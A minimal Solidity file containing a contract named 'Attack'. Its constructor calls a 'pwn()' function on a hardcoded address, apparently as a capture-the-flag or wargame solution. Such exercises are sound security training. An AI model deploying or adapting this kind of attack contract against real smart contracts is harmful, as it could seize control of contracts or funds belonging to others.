// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;


contract Attack {

    constructor() {
        
        (bool success, ) = address(0xAD49d5bD4E8399A871Ef8242D97aec46002Fb5b1).call(abi.encodeWithSignature("pwn()"));
    }

}